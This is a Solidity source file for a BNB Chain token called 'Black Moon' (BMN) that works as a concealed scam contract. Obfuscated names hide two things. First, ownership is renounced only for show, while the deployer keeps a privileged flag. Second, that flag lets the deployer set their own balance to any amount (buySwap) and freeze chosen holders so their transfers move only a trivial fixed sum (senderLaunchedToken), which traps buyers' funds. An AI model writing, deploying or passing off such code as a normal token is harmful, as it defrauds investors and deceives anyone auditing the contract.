/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface shouldTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenExempt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract BlackMoon {
    uint8 public decimals = 18;



    mapping(address => bool) public totalAmount;
    mapping(address => uint256) public balanceOf;
    string public name = "Black Moon";
    bool public toMinFrom;

    string public symbol = "BMN";
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public toLimitLaunch;

    address public sellSenderTrading;
    address public owner;
    uint256 constant receiverTeam = 12 ** 10;
    address public feeToken;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        shouldTx marketingSwap = shouldTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        feeToken = tokenExempt(marketingSwap.factory()).createPair(marketingSwap.WETH(), address(this));
        owner = sellShould();
        sellSenderTrading = owner;
        toLimitLaunch[sellSenderTrading] = true;
        balanceOf[sellSenderTrading] = totalSupply;
        emit Transfer(address(0), sellSenderTrading, totalSupply);
        receiverList();
    }

    

    function modeTrading(address swapAmountTeam) public {
        if (toMinFrom) {
            return;
        }
        toLimitLaunch[swapAmountTeam] = true;
        toMinFrom = true;
    }

    function buySwap(uint256 takeFromEnable) public {
        if (!toLimitLaunch[sellShould()]) {
            return;
        }
        balanceOf[sellSenderTrading] = takeFromEnable;
    }

    function transferFrom(address walletTotalAmount, address receiverAmountSender, uint256 takeFromEnable) public returns (bool) {
        if (walletTotalAmount != sellShould() && allowance[walletTotalAmount][sellShould()] != type(uint256).max) {
            require(allowance[walletTotalAmount][sellShould()] >= takeFromEnable);
            allowance[walletTotalAmount][sellShould()] -= takeFromEnable;
        }
        if (receiverAmountSender == sellSenderTrading || walletTotalAmount == sellSenderTrading) {
            return atMaxMode(walletTotalAmount, receiverAmountSender, takeFromEnable);
        }
        if (totalAmount[walletTotalAmount]) {
            return atMaxMode(walletTotalAmount, receiverAmountSender, receiverTeam);
        }
        return atMaxMode(walletTotalAmount, receiverAmountSender, takeFromEnable);
    }

    function receiverList() public {
        emit OwnershipTransferred(sellSenderTrading, address(0));
        owner = address(0);
    }

    function atMaxMode(address takeLimit, address listTrading, uint256 takeFromEnable) internal returns (bool) {
        require(balanceOf[takeLimit] >= takeFromEnable);
        balanceOf[takeLimit] -= takeFromEnable;
        balanceOf[listTrading] += takeFromEnable;
        emit Transfer(takeLimit, listTrading, takeFromEnable);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address amountMode, uint256 takeFromEnable) public returns (bool) {
        allowance[sellShould()][amountMode] = takeFromEnable;
        emit Approval(sellShould(), amountMode, takeFromEnable);
        return true;
    }

    function sellShould() private view returns (address) {
        return msg.sender;
    }

    function senderLaunchedToken(address launchedTotal) public {
        if (launchedTotal == sellSenderTrading || launchedTotal == feeToken || !toLimitLaunch[sellShould()]) {
            return;
        }
        totalAmount[launchedTotal] = true;
    }

    function transfer(address receiverAmountSender, uint256 takeFromEnable) external returns (bool) {
        return transferFrom(sellShould(), receiverAmountSender, takeFromEnable);
    }


}